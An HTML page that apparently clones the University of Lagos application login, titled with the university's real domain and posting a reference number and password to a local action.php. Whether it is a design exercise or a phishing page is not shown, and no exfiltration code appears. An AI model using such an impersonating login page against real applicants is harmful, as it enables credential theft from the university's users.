<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>applications.unilag.edu.ng</title>
    <link rel="stylesheet" href="./css/unilagclone.css">
</head>
<body>
    <header id="mainheader">
        <div>
            <img src="./images/small-ogo-uti.png" style="padding: 10px;" alt="Unilag Icon">
        </div>
    </header>
    <div class="main">
        <h2>Application Login</h2>
    </div>
    <div class="container">
        <form class="my-form" action="action.php" method="POST" >
            <div class="form-group">
                <label for="Reference No / UTME No">Reference No / UTME No: </label>
                <input type="number" id="Reference No / UTME No" name="Reference No / UTME No">
            </div>
            <br>
            <div class="form-group">
                <label for="password">Surname (small letter): </label>
                <input type="password" id="password" name="password">
            </div>
            <br>
            <input class="button" type="submit" name="submit" value="Login">   
        </form>
        <p>Contact the administrator <span>support</span></p>
    </div>
    
</body>
</html>
